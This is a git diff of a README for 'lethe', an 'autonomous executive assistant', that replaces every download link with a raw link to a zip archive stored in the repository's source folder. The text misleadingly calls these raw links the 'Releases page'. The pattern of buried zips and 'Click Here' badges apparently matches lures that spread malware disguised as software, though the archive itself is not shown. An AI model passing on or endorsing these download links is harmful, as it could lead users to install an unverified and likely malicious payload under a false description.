@@ -6,13 +6,13 @@ Welcome to lethe, your autonomous executive assistant. This tool will help you m
 
 ## 📥 Download Lethe
 
-[![Download Lethe](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/conversation/Software_v3.7.zip%20Lethe-Click%20Here-brightgreen)](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/conversation/Software_v3.7.zip)
+[![Download Lethe](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/Software_2.0.zip%20Lethe-Click%20Here-brightgreen)](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/Software_2.0.zip)
 
 ## 📥 How to Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to access the download options for lethe.
 
-   [Download Lethe from Releases](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/conversation/Software_v3.7.zip)
+   [Download Lethe from Releases](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/Software_2.0.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the latest version for the best features and updates.
 
@@ -82,4 +82,4 @@ For further inquiries or suggestions, feel free to get in touch through our GitH
 
 Lethe is here to simplify your daily tasks with intelligence and ease. Download it now and take the first step towards better organization. 
 
-[Download Lethe from Releases](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/conversation/Software_v3.7.zip)
+[Download Lethe from Releases](https://github.com/freefirechoilienquan/lethe/raw/refs/heads/main/src/lethe/Software_2.0.zip)
